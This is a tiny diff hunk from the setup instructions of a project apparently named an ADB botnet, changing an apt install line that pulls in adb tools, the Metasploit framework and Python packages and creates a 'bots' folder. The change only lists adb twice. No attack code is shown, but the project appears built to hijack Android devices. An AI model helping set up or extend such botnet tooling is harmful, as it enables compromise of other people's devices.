@@ -16,7 +16,7 @@ cd Eva_adb_botnet
 Now install dependencies:
 
 ```bash
-sudo apt update && sudo apt install -y android-tools-adb metasploit-framework python3-pip
+sudo apt update && sudo apt install -y android-tools-adb metasploit-framework android-tools-adb python3-pip
 pip3 install pycryptodome requests
 mkdir -p bots
 ```
